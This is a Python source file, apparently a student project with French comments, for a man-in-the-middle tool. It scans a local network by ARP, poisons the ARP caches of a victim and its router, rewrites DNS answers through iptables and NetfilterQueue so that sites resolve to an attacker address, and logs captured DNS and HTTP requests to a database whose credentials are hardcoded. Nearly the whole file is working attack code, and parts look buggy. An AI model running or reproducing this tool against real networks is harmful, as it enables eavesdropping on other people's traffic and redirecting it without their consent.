# !/usr/bin/python
# -*- coding: utf-8

from scapy.all import *
from netfilterqueue import NetfilterQueue
import os 
import sys
import time
from datetime import date
import mariadb


mydb = mariadb.connect(
	host="localhost",
	user="MIMT",
	password="mitmpass",
	database="mitm_tool"
	)

mycursor = mydb.cursor()


"""
def scan_ip(plage_ip): #on crée une fonction qui va cherher les ip disponibles sur la palge ip saisi
	rep, nonRep = sr(IP(dst=plage_ip)/ICMP()) #on crée et envoi un paquet IP() et CMTP() a destination de la plage ip a scanner 
	list_ip=[] # on cree une list pour y stocker la list des ip displonible sur le réseau local 
	for element in rep : #pour tout element dans la liste rep
		list_ip.append(element[1].src) # on ajoute chaque ip qui a repondun dans la list 
	return list_ip # on renvoi le resultat de la  list 

"""

def recup_dns():
	today = date.today()
	dateinfo = today.strftime("%d %B %y")
	list_dns = []
	file = open("dns.txt",'r')
	line = file.readlines()

	for lines in line:
		dns=lines
		requete = dns[2:-3]
		list_dns.append(dateinfo)
		list_dns.append(requete)
	file.close()

	return list_dns

def recup_http():
	today = date.today()
	dateinfo = today.strftime("%d %B %y")
	list_HTTP = []
	file = open("http.txt",'r')
	line = file.readlines()

	for lines in line:
		request = lines
		request = request.split(",")
		url = request[0]
		method = request[1]
		method = method[0:]
		
		list_HTTP.append(dateinfo)
		list_HTTP.append(url)
		list_HTTP.append(method)	
	file.close()

	return list_HTTP
	


def insert_data(ip,list_plage_ip, data_ip_active,list_dns, list_HTTP):
	it1 = iter(list_plage_ip)
	tuple_plage_ip = zip(it1, it1)
	tuple_plage_ip = list(tuple_plage_ip)
	print(tuple_plage_ip)

	it2 = iter(data_ip_active)
	tuple_ip_active = zip(it2, it2, it2)
	tuple_ip_active = list(tuple_ip_active)
	print(tuple_ip_active)

	it3=iter(list_dns)
	tuple_requete_dns= zip(it3, it3)
	tuple_requete_dns = list(tuple_requete_dns)
	print(tuple_requete_dns)

	it4=iter(list_HTTP)
	tuple_requete_HTTP= zip(it4,it4,it4)
	tuple_requete_HTTP = list(tuple_requete_HTTP)


	mycursor = mydb.cursor()

	Q1= "CREATE TABLE IF NOT EXISTS Plage_ip(id_plageIP INT AUTO_INCREMENT PRIMARY KEY, Ip VARCHAR(18) NOT NULL, date VARCHAR(18) NOT NULL)"
	Q2= "CREATE TABLE IF NOT EXISTS Ip_active(id_active INT AUTO_INCREMENT PRIMARY KEY, Ip_active VARCHAR(18) NOT NULL, date VARCHAR(14) NOT NULL, Adresse_mac VARCHAR(18) NOT NULL, plage_ip INT NOT NULL, FOREIGN KEY(plage_ip) REFERENCES Plage_ip(id_plageIP))"
	Q3= "CREATE TABLE IF NOT EXISTS DNS_Request(id_dns INT AUTO_INCREMENT PRIMARY KEY, date VARCHAR(14) NOT NULL, DNS_query VARCHAR(50) NOT NULL, adresse_ip INT NOT NULL, FOREIGN KEY(adresse_ip) REFERENCES Ip_active(id_active))"
	Q4= "CREATE TABLE IF NOT EXISTS HTTP_Request(id_request INT AUTO_INCREMENT PRIMARY KEY, date VARCHAR(14) NOT NULL, url LONGTEXT NOT NULL ,method VARCHAR(50) NOT NULL , adresse_ip INT NOT NULL, FOREIGN KEY(adresse_ip) REFERENCES Ip_active(id_active)) "


	Q5= "INSERT INTO Ip_active(date,Ip_active,Adresse_mac,plage_ip) VALUES(%s,%s,%s,%s)"
	Q6= "INSERT INTO DNS_Request(date, DNS_query,adresse_ip) VALUES (%s,%s,%s)"
	Q7= "INSERT INTO HTTP_Request(date,url,method,adresse_ip) VALUES (%s,%s,%s,%s)"

	mycursor.execute(Q1)
	mycursor.execute(Q2)
	mycursor.execute(Q3)
	mycursor.execute(Q4)


	mycursor.executemany("INSERT INTO Plage_ip(Ip, date) VALUES(%s, %s)",tuple_plage_ip)
	last_id = mycursor.lastrowid

	for x in tuple_ip_active:
		mycursor.execute(Q5,x+(last_id,))

	time.sleep(10)

	mycursor.execute("SELECT id_active FROM Ip_active where Ip_active LIKE ? AND plage_ip LIKE ?", ('%'+ ip + '%','%',last_id,'%'))

	for x in mycursor:
		num_id = x[0]
		print(num_id)

	new_last_id = mycursor.lastrowid

	for y in tuple_requete_dns : 
		mycursor.execute(Q6,y+(num_id,)) 

	for z in tuple_requete_HTTP :
		mycursor.execute(Q7,z+(num_id,)) 

	mydb.commit()

	
def add_plage_ip(data):

	mycursor = mydb.cursor()
	mycursor.execute("""INSERT INTO Plage_ip (Ip, date) VALUES(%s, %s)""", data)
	mydb.commit()

def scan_ip(plage_ip):

	list_ip = []
	request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=plage_ip)
	rep, nonRep = srp(request, timeout=2, retry=1)

	for sent, receive in rep:
		list_ip.append(receive.psrc)
	return list_ip


def get_Ip_Active(list_IP):
	today = date.today()
	dateinfo = today.strftime("%d %B %y")
	data_ip_active = [] # je crée une liste pour y stoké les info qui irons dans la base de donnée 
	for ip in list_IP : # pour les ip contenue dans la list_IP
		arp_requests=ARP(pdst=ip) # on crée une requete arp qui aura pour destination les ip trouver 
		broadcast=Ether(dst="ff:ff:ff:ff:ff:ff") #on crée un trame ethernet qui a pour dst l'adresse MAC de broadcast
		arp_requests_broadcast = broadcast/arp_requests  #on combine ses deux trames
	
		rep=srp(arp_requests_broadcast, timeout=5, verbose=False )[0] #on les envoi est on recupere la reponse 
		for element in rep : #pour les element dans la reponse 
			data_ip_active.append(dateinfo)# j'ajoute la date du jour a ma list pour la bdd
			data_ip_active.append(element[1].psrc) # j'ajoute l'adresse ip 
			data_ip_active.append(element[1].hwsrc) #j'joute l'adresse mac
			

	return data_ip_active


def scan_Mac(list_IP): #on cree un fontion qui va trouver les adresses mac correspondant au ip 
	dic_info ={}	#on crée un dictionnaire vide pour pouvoir y stocker nos informations	
	for ip in list_IP : # pour les ip contenue dans la list_IP
		arp_requests=ARP(pdst=ip) # on crée une requete arp qui aura pour destination les ip trouver 
		broadcast=Ether(dst="ff:ff:ff:ff:ff:ff") #on crée un trame ethernet qui a pour dst l'adresse MAC de broadcast
		arp_requests_broadcast = broadcast/arp_requests  #on combine ses deux trames
	
		rep=srp(arp_requests_broadcast, timeout=5, verbose=False )[0] #on les envoi est on recupere la reponse 
		for element in rep : #pour les element dans la reponse 
			print("Adresse ip cible : {}\nAdresse Mac = {} ".format(element[1].psrc,element[1].hwsrc)) # on recupere les info de ip et de son adresse mac
			print("---------------------------")

			dic_info[element[1].psrc]=element[1].hwsrc # place l'ip et l'adresse mac dans le dictionnaire 

	

	return dic_info #on renvoi le dictionnaire qui contient nos ip et nos adresse MAC


def recup_mac_adress(dic_info):
	for ip, mac in dic_info.items():
		adressMac = mac 

	return adressMac 


def atck_mitm(targetIP, routerIP ,RouterMac, targetMac) :
	send(ARP(op=2,pdst=targetIP, psrc=routerIP, hwdst=targetMac),verbose=False)
	send(ARP(op=2, pdst=routerIP , psrc=targetIP , hwdst=RouterMac) ,verbose=False)
	

def reARP(targetIP, routerIP, RouterMac, targetMac):
	send(ARP(pdst=routerIP, psrc=targetIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=targetMac), count=5)
	send(ARP(pdst=targetIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=RouterMac), count=5)
	os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def list_ip():
	nombre_ip = int(input("Saisissez le nombre d'ip que vous souhaiter spoofer : "))
	i = 0
	list_ip=[]

	while i < nombre_ip :
		ip = input("Saisissez l'adresse IP a scanner: ")
		list_ip.append(ip)
		i += 1

	return list_ip
	
dns_hosts = {
"""
    b"www.google.com": "192.168.1.20",
    b"google.com": "192.168.1.20",
    b"www.facebook.com": "192.168.1.20"
 """
}


def recup_packet(packet): #nous allons recuperer les packet qui sont mis dans notre liste d'attente grace a netfilter

	packet_scapy = IP(packet.get_payload()) #on converti les packet netfilter en packet scapy 

	if packet_scapy.haslayer(DNS): #si le paquet est de type DNS, on le modifie
		print("requete dns :", packet_scapy.summary)
		try : 
			modify_packet=modif_packet(packet_scapy) #on utilise une fonction qui modifira notre packet
		except IndexError : 
			pass

		print("[Aprés]:",modify_packet.summary())
		packet.set_payload(bytes(modify_packet)) #on converti le packet modifié en paquet netfilter
	packet.accept()
				

def modif_packet(packet):


	qname=packet[DNSQR].qname
	print("qname : {} ".format(qname))
	if qname in dns_hosts: # si le site web est dans la liste 
		packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname]) #on crée une nouvelle reponse dns qui va remplacer l'original
		packet[DNS].ancount=1
	
		del packet[IP].len
		del packet[IP].chksum
		del packet[UDP].len
		del packet[UDP].chksum


	return packet # on renvoi le paquet modifier 



def dns_spoof():

	os.system("iptables -I FORWARD -j NFQUEUE --queue-num 1 ")

	queue = NetfilterQueue()
	try:
		queue.bind(1,recup_packet)
		queue.run()
	except KeyboardInterrupt :
			os.system("iptables --flush")


